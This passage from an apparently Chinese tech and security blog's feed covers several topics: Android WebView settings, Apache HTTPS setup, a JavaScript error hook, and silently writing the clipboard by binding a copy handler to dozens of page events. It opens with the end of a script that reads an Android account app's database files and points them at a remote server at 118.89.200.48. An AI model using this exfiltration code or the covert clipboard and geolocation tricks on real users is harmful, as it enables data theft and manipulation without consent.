class="comment">//alert(parent+file);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readDir</span>(<span class="params">dir</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> res = get(dir);</span><br><span class="line">parseText(res);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> path = <span class="string">"file:///data/data/com.bbk.account/databases/"</span>;</span><br><span class="line"><span class="keyword">var</span> remoteUrl = <span class="string">"http://118.89.200.48/brute/all.php"</span>;</span><br><span class="line">readDir(path);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>js直接在页面输出错误</title>
      <link href="/2018/01/24/js%E8%BE%93%E5%87%BA%E9%94%99%E8%AF%AF/"/>
      <url>/2018/01/24/js%E8%BE%93%E5%87%BA%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<p>hook了window.onerror事件<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">msg, url, lineNo, columnNo, error</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> string = msg.toLowerCase();</span><br><span class="line">    <span class="keyword">var</span> substring = <span class="string">"script error"</span>;</span><br><span class="line">    <span class="keyword">if</span> (string.indexOf(substring) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">//alert('Script Error: See Browser Console for Detail');</span></span><br><span class="line">        <span class="keyword">var</span> message = [</span><br><span class="line">            <span class="string">'Message: '</span> + msg,</span><br><span class="line">            <span class="string">'URL: '</span> + url,</span><br><span class="line">            <span class="string">'Line: '</span> + lineNo,</span><br><span class="line">            <span class="string">'Column: '</span> + columnNo,</span><br><span class="line">            <span class="string">'Error object: '</span> + <span class="built_in">JSON</span>.stringify(error)</span><br><span class="line">        ].join(<span class="string">'\n'</span>);</span><br><span class="line">        alert(<span class="string">'window.onerror: script error '</span>+ message);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> message = [</span><br><span class="line">            <span class="string">'Message: '</span> + msg,</span><br><span class="line">            <span class="string">'URL: '</span> + url,</span><br><span class="line">            <span class="string">'Line: '</span> + lineNo,</span><br><span class="line">            <span class="string">'Column: '</span> + columnNo,</span><br><span class="line">            <span class="string">'Error object: '</span> + <span class="built_in">JSON</span>.stringify(error)</span><br><span class="line">        ].join(<span class="string">'\n'</span>);</span><br><span class="line">        <span class="keyword">if</span>(msg.indexOf(<span class="string">'SyntaxError'</span>) != <span class="number">-1</span> || msg.indexOf(<span class="string">'Uncaught ReferenceError'</span>) != <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(message);</span><br><span class="line">            alert(<span class="string">'window.onerror: SyntaxError'</span>+ message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">a=s2</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>apache搭建https站</title>
      <link href="/2018/01/17/apache%E6%90%AD%E5%BB%BAhttps%E7%AB%99/"/>
      <url>/2018/01/17/apache%E6%90%AD%E5%BB%BAhttps%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<ol><li>激活SSL模块</li></ol><p>[html] view plain copy<br>sudo a2enmod ssl<br>重启apache2<br>[html] view plain copy<br>sudo service apache2 restart  </p><p>2.<br>创建自签名SSL证书</p><p>[html] view plain copy<br>sudo mkdir /etc/apache2/ssl<br>sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/apache2/ssl/apache.key -out /etc/apache2/ssl/apache.crt  </p><p>3.<br> 编辑配置文件，修改描红部分<br>[html] view plain copy<br>sudo vim /etc/apache2/sites-available/default-ssl.conf<br>[html] view plain copy</p><ifmodule mod_ssl.c=""><br>    <virtualhost _default_:443=""><br>        ServerAdmin <span style="color:#ff0000;">admin@example.com<br>        ServerName your_domain.com<br>        ServerAlias www.your_domain.com</span><br>        DocumentRoot <span style="color:#ff0000;">/var/www/html</span><br>        ErrorLog ${APACHE_LOG_DIR}/error.log<br>        CustomLog ${APACHE_LOG_DIR}/access.log combined<br>        SSLEngine on<br>        SSLCertificateFile <span style="color:#ff0000;">/etc/apache2/ssl/apache.crt</span><br>        SSLCertificateKeyFile <span style="color:#ff0000;">/etc/apache2/ssl/apache.key</span><br>        <filesmatch "\.(cgi|shtml|phtml|php)$"=""><br>                        SSLOptions +StdEnvVars<br>        </filesmatch><br>        <directory usr="" lib="" cgi-bin=""><br>                        SSLOptions +StdEnvVars<br>        </directory><br>        BrowserMatch “MSIE [2-6]” \<br>                        nokeepalive ssl-unclean-shutdown \<br>                        downgrade-1.0 force-response-1.0<br>        BrowserMatch “MSIE [17-9]” ssl-unclean-shutdown<br>    </virtualhost><br></ifmodule>  <p>4.<br>激活SSL虚拟Host</p><p>[html] view plain copy<br>sudo a2ensite default-ssl.conf<br>重启apache2<br>[html] view plain copy<br>sudo service apache2 restart  </p><p>5.<br>测试</p><p>[html] view plain copy<br><a href="https://server_domain_name_or_IP" target="_blank" rel="noopener">https://server_domain_name_or_IP</a>  </p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android WebView那些事儿</title>
      <link href="/2018/01/17/WebView%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/"/>
      <url>/2018/01/17/WebView%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/</url>
      
        <content type="html"><![CDATA[<p>Android WebView经常会有一些奇奇怪怪的问题，为了避免日后重复采坑，统一在这里总结下：</p><h2 id="setWebContentsDebuggingEnabled"><a href="#setWebContentsDebuggingEnabled" class="headerlink" title="setWebContentsDebuggingEnabled"></a>setWebContentsDebuggingEnabled</h2><p>setWebContentsDebuggingEnabled()用来配置WebView是否支持远程调试，当被设置为true时，既可以用PC端的Chrome来调试手机端的WebView。具体操作如下：</p><ol><li><p>WebView配置如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//KITKAT版本一下不支持这个API</span></span><br><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.KITKAT) &#123;</span><br><span class="line">            WebView.setWebContentsDebuggingEnabled(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>手机通过USB连接PC,在Chrome下输入”chrome://inspect”即可进入调试页，同时会显示出所有可调式的WebView页，审查元素、network等调试操作和PC上相同。</p></li></ol><p><img src="/images/pasted-9.png" alt="upload successful"></p><h2 id="setWebChromeClient和setWebViewClient"><a href="#setWebChromeClient和setWebViewClient" class="headerlink" title="setWebChromeClient和setWebViewClient"></a>setWebChromeClient和setWebViewClient</h2><ul><li>WebViewClient主要帮助WebView处理各种通知、请求事件的，比如：<br>onLoadResource，onPageStart，onPageFinish，onReceiveError，onReceivedHttpAuthRequest 等。</li><li>WebChromeClient主要辅助WebView处理Javascript的对话框、网站图标、网站title、加载进度等，比如:<br>onCloseWindow(关闭WebView)，onCreateWindow()，onJsAlert (WebView上alert无效，需要定制WebChromeClient处理弹出)，onJsPrompt，onJsConfirm，onProgressChanged，onReceivedIcon，onReceivedTitle 等等。</li></ul><h2 id="addjavascriptinterface"><a href="#addjavascriptinterface" class="headerlink" title="addjavascriptinterface"></a>addjavascriptinterface</h2><p>addjavascriptinterface可以把一个java对象导出，通过js来调用java对象。如果这个对象涉及到敏感操作，有可能产生安全问题。</p><p>使用实例如下：</p><p>定义一个AndroidToast，实现弹出一个toast功能，并将其导出<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AndroidToast</span> </span>&#123;</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">            Toast.makeText(MainActivity.<span class="keyword">this</span>, str, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>WebView进行设置，开启JavaScipt，注册JavascriptInterface的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private void initView() &#123;</span><br><span class="line">        webView = (WebView) findViewById(R.id.webView);</span><br><span class="line"></span><br><span class="line">        WebSettings webSettings = webView.getSettings();</span><br><span class="line">        webSettings.setJavaScriptEnabled(true);</span><br><span class="line">        webSettings.setDefaultTextEncodingName(&quot;UTF-8&quot;);</span><br><span class="line">        webView.addJavascriptInterface(new AndroidToast(), &quot;AndroidToast&quot;);</span><br><span class="line">        webView.loadUrl(&quot;file:///android_asset/index.html&quot;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>在javascript中调用方法，通过window属性可以找到映射的对象AndroidToast,直接调用它的show方法即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function toastClick()&#123;</span><br><span class="line">        window.AndroidToast.show(&apos;from js&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="setGeolocationEnabled"><a href="#setGeolocationEnabled" class="headerlink" title="setGeolocationEnabled"></a>setGeolocationEnabled</h2><p>setGeolocationEnabled用来配置是否允许H5定位，默认为true。通过一定的配置，可以使WebView中的H5定位时，用户不会受到任何定位提示。</p><p>参照官方开发文档，实现h5定位需要满足三个条件：</p><ul><li>APP本身必须具有定位权限</li><li>APP必须实现onGeolocationPermissionsShowPrompt(String, GeolocationPermissions.Callback) 这个回调函数，当js调用h5定位的API时，这个函数会被调用</li><li>发起定位请求的站点必须为可信origin,如https,http的将不允许定位</li></ul><p>下边这行代码用来处理定位请求，第一个参数是发起定位请求的origin,第二个 boolean 类型的参数表示是否授予网页定位权限；而第三个 boolean 类型的参数则表示是否保留这个权限状态。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback.invoke(origin, <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></p><p>具体代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">前端实现</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p id=<span class="string">"demo"</span>&gt;点击按钮获取您当前坐标（可能需要比较长的时间获取）：&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;button onclick="getLocation()"&gt;点我&lt;/</span>button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> x=<span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLocation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (navigator.geolocation)</span><br><span class="line">&#123;</span><br><span class="line">navigator.geolocation.getCurrentPosition(showPosition);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">x.innerHTML=<span class="string">"该浏览器不支持获取地理位置。"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showPosition</span>(<span class="params">position</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x.innerHTML=<span class="string">"纬度: "</span> + position.coords.latitude + </span><br><span class="line"><span class="string">"&lt;br&gt;经度: "</span> + position.coords.longitude;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest文件：</span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_COARSE_LOCATION"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_FINE_LOCATION"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WebView contentWv = (WebView) findViewById(R.id.wv_content);</span><br><span class="line">WebSettings settings = contentWv.getSettings();</span><br><span class="line">settings.setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//setGeolocationEnabled默认为true</span></span><br><span class="line">contentWv.setWebChromeClient(<span class="keyword">new</span> WebChromeClient()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onGeolocationPermissionsShowPrompt</span><span class="params">(String origin, GeolocationPermissions.Callback callback)</span> </span>&#123;</span><br><span class="line">        callback.invoke(origin, <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">super</span>.onGeolocationPermissionsShowPrompt(origin, callback);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">contentWv.loadUrl(<span class="string">"file:///android_asset/location.html"</span>);</span><br></pre></td></tr></table></figure><p>一般比较合适的做法是，在该回调函数中设置一个对话框，告知用户是否授权定位操作。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">wv.setWebChromeClient(<span class="keyword">new</span> WebChromeClient()&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onGeolocationPermissionsShowPrompt</span><span class="params">(<span class="keyword">final</span> String origin, <span class="keyword">final</span> GeolocationPermissions.Callback callback)</span> </span>&#123;</span><br><span class="line">    AlertDialog.Builder builder = <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">    builder.setMessage(<span class="string">"Allow to access location information?"</span>);</span><br><span class="line">    DialogInterface.OnClickListener dialogButtonOnClickListener = <span class="keyword">new</span> DialogInterface.OnClickListener()  &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> clickedButton)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (DialogInterface.BUTTON_POSITIVE == clickedButton) &#123;</span><br><span class="line">                callback.invoke(origin, <span class="keyword">true</span>, <span class="keyword">true</span>);<span class="comment">//允许</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (DialogInterface.BUTTON_NEGATIVE == clickedButton) &#123;</span><br><span class="line">                callback.invoke(origin, <span class="keyword">false</span>, <span class="keyword">false</span>);<span class="comment">//拒绝</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    builder.setPositiveButton(<span class="string">"Allow"</span>, dialogButtonOnClickListener);</span><br><span class="line">    builder.setNegativeButton(<span class="string">"Deny"</span>, dialogButtonOnClickListener);</span><br><span class="line">    builder.show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>移动端使用JavaScript自动写入剪贴板</title>
      <link href="/2018/01/12/%E7%A7%BB%E5%8A%A8%E7%AB%AFJavaScript%E5%86%99%E5%85%A5%E5%89%AA%E8%B4%B4%E6%9D%BF/"/>
      <url>/2018/01/12/%E7%A7%BB%E5%8A%A8%E7%AB%AFJavaScript%E5%86%99%E5%85%A5%E5%89%AA%E8%B4%B4%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>近期风靡的“吱口令”红包在互联网上铺天盖地，用户复制一段“吱口令”，打开支付宝就可以直接进入抢红包的页面。研究发现，支付宝是通过读取用户剪贴板数据，提取出吱口令，之后加载抢红包页面。</p><p>如果可以实现在用户打开某个网页的时候就写入剪贴板，那么用户会在不知不觉打开支付宝时，就会直接进入领取页面。因此，我们尝试了js自动写入剪贴板是否可行。</p><h1 id="遍历js事件"><a href="#遍历js事件" class="headerlink" title="遍历js事件"></a>遍历js事件</h1><p>PC端似乎需要用户主动点击才能实现写入剪贴板，我们首先写一段写入剪贴板的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; id=&quot;website&quot; value=&quot;tobecopydata&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function copy(e) &#123;</span><br><span class="line"></span><br><span class="line"> website.select()</span><br><span class="line"> document.execCommand(&apos;copy&apos;);</span><br><span class="line"> &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>之后通过遍历js事件来触发复制操作<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// event handler</span></span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'blur'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'error'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'focus'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'load'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'resize'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'scroll'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'afterprint'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'beforeprint'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'beforeunload'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'hashchange'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'languagechange'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'message'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'messageerror'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'offline'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'online'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'pagehide'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'pageshow'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'popstate'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'rejectionhandled'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'storage'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'unhandledrejection'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'unload'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'abort'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'cancel'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'canplay'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'canplaythrough'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'change'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'click'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'close'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'contextmenu'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'cuechange'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'dblclick'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'drag'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'dragend'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'dragenter'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'dragleave'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'dragover'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'dragstart'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'drop'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'durationchange'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'emptied'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'ended'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'input'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'invalid'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'keydown'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'keypress'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'keyup'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'loadeddata'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'loadedmetadata'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'loadstart'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'mousedown'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'mouseenter'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span 